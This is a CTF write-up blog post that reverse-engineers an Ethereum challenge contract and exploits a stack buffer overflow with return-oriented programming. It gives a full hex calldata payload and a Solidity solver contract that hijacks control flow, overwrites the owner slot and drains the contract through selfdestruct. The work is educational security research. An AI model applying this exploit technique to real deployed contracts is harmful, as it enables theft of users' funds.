[ ![samczsun](https://samczsun.com/content/images/2022/01/casual-no-bg-
med.png) ](https://samczsun.com)

  * [Home](https://samczsun.com/)
  * [Research](https://samczsun.com/research/)
  * [Branding](https://samczsun.com/branding/)
  * [Contact](https://samczsun.com/contact/)

[ ](https://twitter.com/samczsun "Twitter")

Subscribe

# ConsenSys CTF - Rop EVM

A second CTF from ConsenSys Diligence. The solution is a blast from the past.

  * [ ![samczsun](/content/images/size/w100/2022/01/casual-med-1.png) ](/author/samczsun/)

#### [samczsun](/author/samczsun/)

Mar 22, 2019 • 4 min read

This is the second writeup for a series of CTFs by ConsenSys Diligence. The
first writeup can be found [here](https://samczsun.com/consensys-ctf-
writeup/).

## Introduction

The CTF contract was deployed to
[0xefa51bc7aafe33e6f0e4e44d19eab7595f4cca87](https://ethstats.io/account/0xefa51bc7aafe33e6f0e4e44d19eab7595f4cca87)
and announced [here](https://medium.com/consensys-diligence/consensys-
diligence-ethereum-hacking-challenge-2-bf3dfff639e0).

Right off the bat, most decompilers are unable to decompile the contract so
we'll need to resort to reading the disassembly. However,
[Eveem](https://eveem.org/code/0xEfa51BC7AaFE33e6f0E4E44d19Eab7595F4Cca87) is
able to locate four public functions. Three of them have known signatures:

  * get()
  * die()
  * set(uint256)

`get()` and `die()` are simple and can be expressed in pseudocode, shown
below. We can assume that `get()` is provided as a sanity check, while `die()`
is clearly the function we'll need to call to solve this CTF.

    
    
    address private storage_00;
    address private storage_20;
    
    function get() public returns (address) {
    	require(msg.sender != storage_00);
    	return storage_00;
    }
    
    function die() public {
    	require(msg.sender == storage_20);
    	selfdestruct(storage_20);
    }

Upon investigating `set(uint256)`, we notice that it is significantly more
complex than the functions that came before it. This is because a [call
stack](https://en.wikipedia.org/wiki/Call_stack) was manually implemented. The
implementation of the call stack is reproduced in pseudocode below.

    
    
    function stack_push(uint256 value) private {
    	memory[memory[0x100]+0x20] = value;
    	memory[0x100] = memory[0x100] + 0x20;
    }
    
    function stack_get(uint256 depth) private {
    	return memory[memory[0x100] - depth*0x20];
    }
    
    function stack_pop() private returns (uint256 value) {
    	value = memory[memory[0x100]];
    	memory[0x100] = memory[0x100] - 0x20;
    }
    
    function stack_push_frame() private {
    	stack_push(memory[0x100]);
    }
    
    function stack_pop_frame() private returns (uint256 dest) {
    	dest = stack_pop();
    	memory[0x100] = stack_pop();
    }

Using the call stack functions, `set(uint256)` can be expressed as follows:

    
    
    function set(uint256 value) public {
    	stack_push_frame();
    	stack_push(return_lbl);
    	stack_push(value);
    	stack_push(0x00);
    	set_impl();
    return_lbl:
    	return;
    }
    
    function set_impl() private {
    	storage[stack_get(0)] = stack_get(1);
    	stack_pop();
    	stack_pop();
    	goto stack_pop_frame();
    }

Or, even more succinctly:

    
    
    address private storage_00;
    
    function set(uint256 value) public {
    	storage_00 = address(value);
    }

This just leaves the mystery function:

    
    
    function 0x7909947a() public {
    	memory[0x100] = 0x100;
    	stack_push(0x00);
    	var var1 = memory[0x100]; // 0x120
    	stack_push(0x00);
    	memcpy(memory[0x90000], msg.data[0x44], msg.data.length-0x44);
    
    	stack_push_frame();
    	stack_push(irrelevant_lbl);
    	stack_push(0x90000);
    	stack_push(var1);
    	stack_push(msg.data.length - 0x44);
    	stack_push(0x00);
    
    	0x7909947a_impl();
    
    irrelevant_lbl:
    	// some irrelevant code
    }
    
    function 0x7909947a_impl() private {
    	copy_data();
    	memory[stack_get(2) + stack_get(0)] = 0x00;
    	pad_data();
    
    	stack_pop();
    	stack_pop();
    	stack_pop();
    	stack_pop();
    	goto stack_pop_frame();
    }
    
    function copy_data() private {
    	while (stack_get(0) - stack_get(1) != 0) {
    		memory[stack_get(2) + stack_get(0)] = memory[stack_get(3) + stack_get(0)] >> 248;
    		memory[memory[0x100]] = memory[memory[0x100]] + 0x01;
    	}
    }
    
    function pad_data() private {
    	while (stack_get(0) % 0x40 != 0) {
    		memory[stack_get(2) + stack_get(0)] = 0x00;
    		memory[memory[0x100]] = memory[memory[0x100]] + 0x01;
    	}
    }

## Analysis

For those who weren't familiar, the name of this CTF refers to the technique
called [Return Oriented Programming](https://en.wikipedia.org/wiki/Return-
oriented_programming). When attackers are able to overflow the call stack,
they can use ROP to redirect the control flow of the program by clobbering the
return address. The bits of code that attackers redirect control flow to are
called "gadgets".

As the goal of the CTF is to drain the contract of funds, it's clear that we
need to somehow write our address to the storage slot `0x20`. Fortunately, we
have a gadget to do this at `set_impl`, which writes `stack_get(1)` to
`stack_get(0)`.

In order to take advantage of the gadget at `set_impl`, we need our stack to
look something like this:

    
    
    --------------------------------
    |       stack frame set()      |
    --------------------------------
    |  address of 'return' gadget  |     |
    --------------------------------     |   stack grows down
    |          our address         |     V
    --------------------------------
    |             0x20             |
    --------------------------------

However, our stack looks like this when entering `0x7909947a_impl()`:

    
    
    ----------------------------------
    |              0x00              |    <---- this is 0x0120
    ----------------------------------
    |              0x00              |
    ----------------------------------
    |    stack frame 0x7909947a()    |
    ----------------------------------
    |         irrelevant_lbl         |     |
    ----------------------------------     |   stack grows down
    |            0x090000            |     V
    ----------------------------------
    |             0x0120             |
    ----------------------------------
    |     msg.data.length - 0x44     |
    ----------------------------------
    |              0x00              |
    ----------------------------------

When `0x7909947a_impl()` is called, it will copy `msg.data[0x44:]` to
`memory[0x120]`. This means that if our message is longer than `0x40` bytes,
it will clobber the stack frame, then the return address, and so on. However,
we can't fit the four stack items required to use the `set_impl` gadget in the
two empty spaces we have on the stack.

Fortunately, our payload was copied to `memory[0x90000]`. As such, we can
simply update the stack frame pointer to point to somewhere around `0x90000`
where our fake stack will be.

Now that we have a plan, we can start laying out our payload. First, we need
the function signature.

    
    
    7909947a

The first two words are ignored.

    
    
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000

Next, two words will be copied to `memory[0x120]`. The value doesn't matter
because it's unused.

    
    
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000

The next two words will clobber the stack frame pointer and the return
address. The total message will be `0x184` bytes long but the first `0x44`
bytes are ignored, leaving a total of `0x140` bytes. As such, our fake stack
frame will point to `0x90140`. We use `0x2ea` as the return address because
that's where the function `set_impl` is located.

    
    
    0000000000000000000000000000000000000000000000000000000000090140
    00000000000000000000000000000000000000000000000000000000000002ea

Because the payload is copied into memory one byte at a time, we need to be
careful when overwriting the next four words. Fortunately, the first three are
static values. However, the fourth word is the number of bytes currently
copied and so we must specify the number of bytes copied at that point in
time.

    
    
    0000000000000000000000000000000000000000000000000000000000090000
    0000000000000000000000000000000000000000000000000000000000000120
    0000000000000000000000000000000000000000000000000000000000000140
    00000000000000000000000000000000000000000000000000000000000000ff

Finally, we construct the fake stack that `set_impl` will read. We first
specify the address that `set_impl` will return to, which is located at
`return_lbl` or `0x344`. Then, we specify the value we want written to
storage. Finally, we specify the storage slot we want to write to.

    
    
    0000000000000000000000000000000000000000000000000000000000000344
    0000000000000000000000003331B3Ef4F70Ed428b7978B41DAB353Ca610D938
    0000000000000000000000000000000000000000000000000000000000000020

Putting it all together, our payload looks like this:

    
    
    7909947a
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000090140
    00000000000000000000000000000000000000000000000000000000000002ea
    0000000000000000000000000000000000000000000000000000000000090000
    0000000000000000000000000000000000000000000000000000000000000120
    0000000000000000000000000000000000000000000000000000000000000140
    00000000000000000000000000000000000000000000000000000000000000ff
    0000000000000000000000000000000000000000000000000000000000000344
    0000000000000000000000003331B3Ef4F70Ed428b7978B41DAB353Ca610D938
    0000000000000000000000000000000000000000000000000000000000000020

All that's left is to write a contract to trigger the overflow and [claim the
funds](https://etherscan.io/tx/0xd1a83dd897ead5ae4a62a736d41a43475e3c7ccefbd45c777ce8ec539405d7d4).

    
    
    pragma solidity ^0.5.0;
    
    contract Target {
        function get()public returns (address) ;
        function set(uint a) public;
        function die() public;
    }
    
    contract Solver {
        constructor(bytes memory data) public payable {
            (bool result, ) = address(0xEfa51BC7AaFE33e6f0E4E44d19Eab7595F4Cca87).call(data);
            require(result);
            Target(0xEfa51BC7AaFE33e6f0E4E44d19Eab7595F4Cca87).die();
            require(address(this).balance > 0);
            selfdestruct(msg.sender);
        }
    }

## Conclusion

This CTF simulated a program with a classic buffer overflow vulnerability and
was significantly more challenging than the previous. Kudos to the creator,
[Nathan Peercy](https://medium.com/@nathan.peercy), for accurately recreating
the setup in the EVM.

[ ![Hiding in Plain Sight](/content/images/size/w600/2021/11/161381622_xl.jpg)
](/hiding-in-plain-sight/)

[

## Hiding in Plain Sight

Most people trust, but how many people verify?

](/hiding-in-plain-sight/)

  * [ ![samczsun](/content/images/size/w100/2022/01/casual-med-1.png) ](/author/samczsun/)

[samczsun](/author/samczsun/) Nov 11, 2021 • 9 min read

[ ![Two Rights Might Make A
Wrong](/content/images/size/w600/2021/08/53083335_xl.jpg) ](/two-rights-might-
make-a-wrong/)

[

## Two Rights Might Make A Wrong

Too much raw fish doesn’t make a better roll of sushi

](/two-rights-might-make-a-wrong/)

  * [ ![samczsun](/content/images/size/w100/2022/01/casual-med-1.png) ](/author/samczsun/)

[samczsun](/author/samczsun/) Aug 17, 2021 • 8 min read

[ ![The Dangers of Surprising
Code](/content/images/size/w600/2021/08/129446413_xl.jpg) ](/the-dangers-of-
surprising-code/)

[

## The Dangers of Surprising Code

The only thing worse than a bug in your code that breaks everything is a bug
in your code that subtly breaks one thing

](/the-dangers-of-surprising-code/)

  * [ ![samczsun](/content/images/size/w100/2022/01/casual-med-1.png) ](/author/samczsun/)

[samczsun](/author/samczsun/) Aug 13, 2021 • 7 min read

[samczsun](https://samczsun.com) (C) 2022

[Powered by Ghost](https://ghost.org/)

